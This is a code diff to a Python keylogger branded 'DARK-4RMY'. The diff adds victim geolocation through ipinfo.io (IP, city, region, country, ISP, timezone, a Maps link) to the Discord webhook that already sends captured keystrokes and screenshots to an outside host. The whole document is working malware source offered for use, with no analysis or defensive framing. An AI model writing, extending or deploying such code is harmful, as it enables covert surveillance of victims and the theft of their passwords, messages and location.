@@ -7,6 +7,7 @@ import threading
 import os
 import shutil
 import sys
+import requests
 
 WEBHOOK = ""
 
@@ -18,13 +19,23 @@ class DARK4RMY:
         self.interval = interval
         self.screenshot_interval = screenshot_interval
 
-    def send(self, screenshot_data=None):
+    def webhook(self, screenshot_data=None):
         if not self.log:
             return
+        
+        ip, city, region, country, loc, org, timezone, googlemaps = self.getip()
 
         webhook = DiscordWebhook(url=WEBHOOK, username="DARK-4RMY", avatar_url="https://abagond.wordpress.com/wp-content/uploads/2020/07/dark-army.png")
-        embed = DiscordEmbed(title="", description="[DARK-4RMY](https://rvlt.gg/8ez9akZK)", color="FFFFFE")
+        embed = DiscordEmbed(title="", description="[DARK-4RMY](https://rvlt.gg/8ez9akZK)", color="000000")
         embed.set_image(url="https://mir-s3-cdn-cf.behance.net/project_modules/disp/33779762328391.5a8cb66e6f1c5.png")
+        embed.add_embed_field(name="👹 IP", value=f"||{ip}||", inline=False)
+        embed.add_embed_field(name="👹 City", value=f"{city}", inline=False)
+        embed.add_embed_field(name="👹 Region", value=f"{region}", inline=False)
+        embed.add_embed_field(name="👹 Country", value=f"{country}", inline=False)
+        embed.add_embed_field(name="👹 Location", value=f"[G Maps](<{googlemaps}>)", inline=False)
+        embed.add_embed_field(name="👹 ISP", value=f"{org}", inline=False)
+        embed.add_embed_field(name="👹 Timezone", value=f"{timezone}", inline=False)
+
         embed.add_embed_field(name="", value=f"```{self.log}```", inline=False)
         webhook.add_embed(embed)
 
@@ -34,6 +45,25 @@ class DARK4RMY:
         webhook.execute()
         self.log = ""
 
+    def getip(self):
+        try:
+            data = requests.get("https://ipinfo.io/json", timeout=5).json()
+
+            ip = data.get("ip", "N/A")
+            city = data.get("city", "N/A")
+            region = data.get("region", "N/A")
+            country = data.get("country", "N/A")
+            loc = data.get("loc", "N/A")
+            org = data.get("org", "N/A")
+            timezone = data.get("timezone", "N/A")
+            
+            googlemaps = f"https://www.google.com/maps/search/google+map+{city}+{country}"
+
+            return ip, city, region, country, loc, org, timezone, googlemaps
+
+        except:
+            return None
+    
     def timer_log(self):
         if self.timer:
             self.timer.cancel()
@@ -42,10 +72,14 @@ class DARK4RMY:
 
     def send_log(self):
         screenshot_data = self.screenshot()
-        self.send(screenshot_data=screenshot_data)
+        self.webhook(screenshot_data=screenshot_data)
 
     def key(self, key):
-        self.log += key.char if hasattr(key, 'char') and key.char else f" [{key}] "
+        try:
+            if hasattr(key, 'char') and key.char is not None:
+                self.log += key.char
+        except:
+            pass
         self.timer_log()
 
     def screenshot(self):
